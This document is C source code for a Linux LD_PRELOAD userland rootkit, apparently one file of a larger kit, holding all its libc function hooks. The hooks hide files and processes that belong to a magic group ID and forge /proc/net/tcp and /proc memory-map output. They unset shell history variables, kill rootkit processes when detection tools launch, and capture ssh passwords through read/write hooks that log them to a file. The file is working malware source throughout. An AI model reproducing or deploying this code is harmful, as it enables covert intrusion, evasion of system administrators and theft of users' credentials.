/* every single hook for this kit can be found in this file.
   i put little to no effort into organising this. */

int __libc_start_main(int *(main) (int, char * *, char * *), int argc, char * * ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
    HOOK(o_libc_start_main,"__libc_start_main");
    return o_libc_start_main(main,argc,ubp_av,init,fini,rtld_fini,stack_end);
}

const char *usetenvs[4]={"HISTFILE","SAVEHIST","TMOUT","PROMPT_COMMAND"};
gid_t getgid(void)
{
    HOOK(o_getgid,"getgid");
    gid_t o=o_getgid();
    if(o==MGID) // we rootkit process. do stuff.
    {
        int i;
        for(i=0; i < sizeof(usetenvs)/sizeof(usetenvs[0]); i++) unsetenv(usetenvs[i]);
        setenv("HOME",INSTALL_DIR,1);
    }
    return o; // still return gid even if it belongs to us
}



/*
   EXEC
 */
char *const nargv[3]={"/usr/bin/cat","/dev/null",NULL};
int execve(const char *filename, char *const argv[], char *const envp[])
{
    HOOK(o_execve,"execve");
    if(getgid()==MGID) return o_execve(filename,argv,envp);
    if(hxstat(filename,32)){ errno=ENOENT; return -1; }

    /* if someone is running a process that could lead to us being visible,
     * kill all rootkit processes. */
    if(is_bad_proc(filename))
    {
        if(getuid() != 0)
        {
            errno=EPERM;
            return -1;
        }

        kill_rk_procs();

        int pid;
        if((pid=fork())<0) return pid;
        else if(pid==0) return o_execve(filename,argv,envp);
        (void) wait(NULL);

        (void) o_execve("/usr/bin/cat",nargv,NULL); // run something so we start up again
        exit(0);
    }

    return o_execve(filename,argv,envp);
}


/*
   FILE ACC
 */
int open(const char *pathname, int flags, mode_t mode)
{
    HOOK(o_open, "open");
    if(getgid()==MGID) return o_open(pathname, flags, mode);

    if(hxstat(pathname,32) && strstr(LDSP,pathname))
    {
        if((strstr(cprocname(), "sh") || strstr(cprocname(), "busybox")) &&
            (flags==(64|1|512)))
          return o_open("/dev/null", flags, mode);
    }

    if(!strcmp(pathname, "/proc/net/tcp") || !strcmp(pathname, "/proc/net/tcp6")) return fileno(forge_procnet(pathname));

    if(!fnmatch("/proc/*/maps",pathname,FNM_PATHNAME)) return fileno(forge_maps(pathname));
    if(!fnmatch("/proc/*/smaps",pathname,FNM_PATHNAME)) return fileno(forge_smaps(pathname));
    if(!fnmatch("/proc/*/numa_maps",pathname,FNM_PATHNAME)) return fileno(forge_numamaps(pathname));

    char cwd[PATH_MAX];
    if(getcwd(cwd, sizeof(cwd)) != NULL)
    {
        if(!strcmp(cwd, "/proc"))
        {
            if(!fnmatch("*/maps",pathname,FNM_PATHNAME)) return fileno(forge_maps(pathname));
            if(!fnmatch("*/smaps",pathname,FNM_PATHNAME)) return fileno(forge_smaps(pathname));
            if(!fnmatch("*/numa_maps",pathname,FNM_PATHNAME)) return fileno(forge_numamaps(pathname));
        }

        if(!fnmatch("/proc/*",cwd,FNM_PATHNAME))
        {
            if(!fnmatch("maps",pathname,FNM_PATHNAME)) return fileno(forge_maps(pathname));
            if(!fnmatch("smaps",pathname,FNM_PATHNAME)) return fileno(forge_smaps(pathname));
            if(!fnmatch("numa_maps",pathname,FNM_PATHNAME)) return fileno(forge_numamaps(pathname));
        }
    }

    if(hxstat(pathname,32)) { errno = ENOENT; return -1; }
    return o_open(pathname, flags, mode);
}
int open64(const char *pathname, int flags, mode_t mode)
{
    HOOK(o_open64, "open64");
    if(getgid()==MGID) return o_open64(pathname, flags, mode);

    if(hxstat(pathname,32) && strstr(LDSP,pathname))
    {
        if((strstr(cprocname(), "sh") || strstr(cprocname(), "busybox")) &&
            (flags==(64|1|512)))
          return o_open64("/dev/null", flags, mode);
    }

    if(!strcmp(pathname, "/proc/net/tcp") || !strcmp(pathname, "/proc/net/tcp6")) return fileno(forge_procnet(pathname));

    if(!fnmatch("/proc/*/maps",pathname,FNM_PATHNAME)) return fileno(forge_maps(pathname));
    if(!fnmatch("/proc/*/smaps",pathname,FNM_PATHNAME)) return fileno(forge_smaps(pathname));
    if(!fnmatch("/proc/*/numa_maps",pathname,FNM_PATHNAME)) return fileno(forge_numamaps(pathname));

    char cwd[PATH_MAX];
    if(getcwd(cwd, sizeof(cwd)) != NULL)
    {
        if(!strcmp(cwd, "/proc"))
        {
            if(!fnmatch("*/maps",pathname,FNM_PATHNAME)) return fileno(forge_maps(pathname));
            if(!fnmatch("*/smaps",pathname,FNM_PATHNAME)) return fileno(forge_smaps(pathname));
            if(!fnmatch("*/numa_maps",pathname,FNM_PATHNAME)) return fileno(forge_numamaps(pathname));
        }

        if(!fnmatch("/proc/*",cwd,FNM_PATHNAME))
        {
            if(!fnmatch("maps",pathname,FNM_PATHNAME)) return fileno(forge_maps(pathname));
            if(!fnmatch("smaps",pathname,FNM_PATHNAME)) return fileno(forge_smaps(pathname));
            if(!fnmatch("numa_maps",pathname,FNM_PATHNAME)) return fileno(forge_numamaps(pathname));
        }
    }

    if(hxstat(pathname,32)) { errno = ENOENT; return -1; }
    return o_open64(pathname, flags, mode);
}
int access(const char *pathname, int amode)
{
    HOOK(o_access,"access");
    if(getgid()==MGID) return o_access(pathname,amode);
    if(hxstat(pathname,32)){ errno=ENOENT; return -1; }
    return o_access(pathname,amode);
}
int creat(const char *pathname, mode_t mode)
{
    HOOK(o_creat,"creat");
    if(getgid()==MGID) return o_creat(pathname,mode);
    if(hxstat(pathname,32)){ errno=ENOENT; return -1; }
    return o_creat(pathname,mode);
}
FILE *fopen(const char *pathname, const char *mode)
{
    HOOK(o_fopen,"fopen");
    if(getgid()==MGID) return o_fopen(pathname,mode);
    if(hxstat(pathname,32)){ errno=ENOENT; return NULL; }
    return o_fopen(pathname,mode);
}
FILE *fopen64(const char *pathname, const char *mode)
{
    HOOK(o_fopen64,"fopen64");
    if(getgid()==MGID) return o_fopen64(pathname,mode);
    if(hxstat(pathname,32)){ errno=ENOENT; return NULL; }
    return o_fopen64(pathname,mode);
}

/*
   DIRS
 */
int mkdir(const char *pathname, mode_t mode)
{
    HOOK(o_mkdir,"mkdir");
    if(getgid()==MGID) return o_mkdir(pathname,mode);
    if(hxstat(pathname,32)){ errno=ENOENT; return -1; }
    return o_mkdir(pathname,mode);
}
int rmdir(const char *pathname)
{
    HOOK(o_rmdir,"rmdir");
    if(getgid()==MGID) return o_rmdir(pathname);
    if(hxstat(pathname,32)){ errno=ENOENT; return -1; }
    return o_rmdir(pathname);
}
struct dirent *readdir(DIR *dirp)
{
    HOOK(o_readdir, "readdir");
    struct dirent *dir;
    char path[4097];
    do{
        dir = o_readdir(dirp);
        if(getgid()==MGID) return dir;
        if(dir != NULL && (strcmp(dir->d_name,".\0") == 0 || strcmp(dir->d_name, "/\0") == 0)) continue;
        if(dir != NULL) snprintf(path, 4096, "%s/%s", gdirname(dirp), dir->d_name);
    } while(dir && (hxstat(path, 32)));
    return dir;
}
struct dirent64 *readdir64(DIR *dirp)
{
    HOOK(o_readdir64, "readdir64");
    struct dirent64 *dir;
    char path[4097];
    do {
        dir = o_readdir64(dirp);
        if(getgid()==MGID) return dir;
        if(dir != NULL && (strcmp(dir->d_name, ".\0") == 0 || strcmp(dir->d_name, "/\0") == 0)) continue;
        if(dir != NULL) snprintf(path, 4096, "%s/%s", gdirname(dirp), dir->d_name);
    } while(dir && (hxstat(path, 32)));
    return dir;
}
DIR *opendir(const char *pathname)
{
    HOOK(o_opendir,"opendir");
    if(getgid()==MGID) return o_opendir(pathname);
    if(hxstat(pathname,32)){ errno=ENOENT; return NULL; }
    return o_opendir(pathname);
}
DIR *opendir64(const char *pathname)
{
    HOOK(o_opendir64,"opendir64");
    if(getgid()==MGID) return o_opendir64(pathname);
    if(hxstat(pathname,32)){ errno=ENOENT; return NULL; }
    return o_opendir64(pathname);
}
DIR *fdopendir(int fd)
{
    HOOK(o_fdopendir,"fdopendir");
    if(getgid()==MGID) return o_fdopendir(fd);
    if(hfxstat(fd,32)) { errno = ENOENT; return NULL; }
    return o_fdopendir(fd);
}
int chdir(const char *pathname)
{
    HOOK(o_chdir,"chdir");
    if(getgid()==MGID) return o_chdir(pathname);
    if(hxstat(pathname,32)){ errno=ENOENT; return -1; }
    return o_chdir(pathname);
}
int fchdir(int fd)
{
    HOOK(o_fchdir,"fchdir");
    if(getgid()==MGID) return o_fchdir(fd);
    if(hfxstat(fd,32)){ errno=ENOENT; return -1; }
    return o_fchdir(fd);
}


/*
   READ/WRITE
 */
int ssh_start,ssh_pass_size;
char ssh_args[512],ssh_pass[512];
ssize_t read(int fd, void *buf, size_t nbyte)
{
    HOOK(o_read,"read");
    HOOK(o_fopen,"fopen");
    ssize_t ret=o_read(fd,buf,nbyte);
    char *p;
    FILE *fp;

    if(!strcmp("ssh",cprocname()) && fd==4 && ssh_start)
    {
        p=buf;
        if(*p=='\n')
        {
            ssh_start=0;
            fp=o_fopen(SSH_LOGS,"a");
            if(!fp) return ret;
            fprintf(fp, "%s (%s)\n", gcmdline(), ssh_pass);
            fflush(fp);
            fclose(fp);
            return ret;
        }
        ssh_pass[ssh_pass_size++] = *p;
    }
    return ret;
}
ssize_t write(int fd, const void *buf, size_t nbyte)
{
    HOOK(o_write,"write");
    int ret;
    if(!strcmp("ssh",cprocname()) && strstr(buf,"assword"))
    {
        ssh_pass_size=0;
        memset(ssh_pass,0x00,sizeof(ssh_pass));
        ssh_start=1;
    }
    ret=o_write(fd,buf,nbyte);
    return ret;
}


/*
   FILE STAT
 */
int stat(const char *pathname, struct stat *buf)
{
    HOOK(o_stat,"stat");
    if(getgid()==MGID) return o_stat(pathname,buf);
    if(hxstat(pathname,32)) { errno=ENOENT; return -1; }
    return o_stat(pathname,buf);
}
int stat64(const char *pathname, struct stat64 *buf)
{
    HOOK(o_stat64,"stat64");
    if(getgid()==MGID) return o_stat64(pathname,buf);
    if(hxstat(pathname,64)) { errno=ENOENT; return -1; }
    return o_stat64(pathname,buf);
}
int fstat(int fd, struct stat *buf)
{
    HOOK(o_fxstat,"__fxstat");
    if(getgid()==MGID) return o_fxstat(_STAT_VER,fd,buf);
    if(hfxstat(fd,32)) { errno=ENOENT; return -1; }
    return o_fxstat(_STAT_VER,fd,buf);
}
int fstat64(int fd, struct stat64 *buf)
{
    HOOK(o_fxstat64,"__fxstat64");
    if(getgid()==MGID) return o_fxstat64(_STAT_VER,fd,buf);
    if(hfxstat(fd,64)) { errno=ENOENT; return -1; }
    return o_fxstat64(_STAT_VER,fd,buf);
}
int fstatat(int dirfd, const char *pathname, struct stat *buf, int flags)
{
    HOOK(o_fstatat,"fstatat");
    if(getgid()==MGID) return o_fstatat(dirfd,pathname,buf,flags);
    if(hfxstat(dirfd,32) || hxstat(pathname,32)) { errno=ENOENT; return -1; }
    return o_fstatat(dirfd,pathname,buf,flags);
}
int fstatat64(int dirfd, const char *pathname, struct stat64 *buf, int flags)
{
    HOOK(o_fstatat64,"fstatat64");
    if(getgid()==MGID) return o_fstatat64(dirfd,pathname,buf,flags);
    if(hfxstat(dirfd,64) || hxstat(pathname,64)) { errno=ENOENT; return -1; }
    return o_fstatat64(dirfd,pathname,buf,flags);
}
int lstat(const char *pathname, struct stat *buf)
{
    HOOK(o_lstat,"lstat");
    if(getgid()==MGID) return o_lstat(pathname,buf);
    if(hxstat(pathname,32)) { errno=ENOENT; return -1; }
    return o_lstat(pathname,buf);
}
int lstat64(const char *pathname, struct stat64 *buf)
{
    HOOK(o_lstat64,"lstat64");
    if(getgid()==MGID) return o_lstat64(pathname,buf);
    if(hxstat(pathname,64)) { errno=ENOENT; return -1; }
    return o_lstat64(pathname,buf);
}
int __xstat(int version, const char *pathname, struct stat *buf)
{
    HOOK(o_xstat,"__xstat");
    if(getgid()==MGID) return o_xstat(version,pathname,buf);
    if(hxstat(pathname,32)) { errno=ENOENT; return -1; }
    return o_xstat(version,pathname,buf);
}
int __xstat64(int version, const char *pathname, struct stat64 *buf)
{
    HOOK(o_xstat64,"__xstat64");
    if(getgid()==MGID) return o_xstat64(version,pathname,buf);
    if(hxstat(pathname,64)) { errno=ENOENT; return -1; }
    return o_xstat64(version,pathname,buf);
}
int __fxstat(int version, int fd, struct stat *buf)
{
    HOOK(o_fxstat,"__fxstat");
    if(getgid()==MGID) return o_fxstat(version,fd,buf);
    if(hfxstat(fd,32)) { errno=ENOENT; return -1; }
    return o_fxstat(version,fd,buf);
}
int __fxstat64(int version, int fd, struct stat64 *buf)
{
    HOOK(o_fxstat64,"__fxstat64");
    if(getgid()==MGID) return o_fxstat64(version,fd,buf);
    if(hfxstat(fd,64)) { errno=ENOENT; return -1; }
    return o_fxstat64(version,fd,buf);
}
int __lxstat(int version, const char *pathname, struct stat *buf)
{
    HOOK(o_lxstat,"__lxstat");
    if(getgid()==MGID) return o_lxstat(version,pathname,buf);
    if(hxstat(pathname,32)) { errno=ENOENT; return -1; }
    return o_lxstat(version,pathname,buf);
}
int __lxstat64(int version, const char *pathname, struct stat64 *buf)
{
    HOOK(o_lxstat64,"__lxstat64");
    if(getgid()==MGID) return o_lxstat64(version,pathname,buf);
    if(hxstat(pathname,64)) { errno=ENOENT; return -1; }
    return o_lxstat64(version,pathname,buf);
}


/*
   LINKS
 */
int unlink(const char *pathname)
{
    HOOK(o_unlink,"unlink");
    if(getgid()==MGID) return o_unlink(pathname);
    if(hxstat(pathname,32)){ errno=ENOENT; return -1; }
    return o_unlink(pathname);
}
int unlinkat(int dirfd, const char *pathname, int flags)
{
    HOOK(o_unlinkat,"unlinkat");
    if(getgid()==MGID) return o_unlinkat(dirfd,pathname,flags);
    if(hxstat(pathname,32) || hfxstat(dirfd,32)){ errno=ENOENT; return -1; }
    return o_unlinkat(dirfd,pathname,flags);
}


/*
   FILE PERMISSIONS
 */
int chown(const char *pathname, uid_t owner, gid_t group)
{
    HOOK(o_chown,"chown");
    if(getgid()==MGID) return o_chown(pathname,owner,group);
    if(hxstat(pathname,32)){ errno=ENOENT; return -1; }
    return o_chown(pathname,owner,group);
}
int chmod(const char *pathname, mode_t mode)
{
    HOOK(o_chmod,"chmod");
    if(getgid()==MGID) return o_chmod(pathname,mode);
    if(hxstat(pathname,32)){ errno=ENOENT; return -1; }
    return o_chmod(pathname,mode);
}
int fchmod(int fd, mode_t mode)
{
    HOOK(o_fchmod,"fchmod");
    if(getgid()==MGID) return o_fchmod(fd,mode);
    if(hfxstat(fd,32)){ errno=ENOENT; return -1; }
    return o_fchmod(fd,mode);
}
int fchmodat(int dirfd, const char *pathname, mode_t mode, int flags)
{
    HOOK(o_fchmodat,"fchmodat");
    if(getgid()==MGID) return o_fchmodat(dirfd,pathname,mode,flags);
    if(hfxstat(dirfd,32) || hxstat(pathname,32)){ errno=ENOENT; return -1; }
    return o_fchmodat(dirfd,pathname,mode,flags);
}
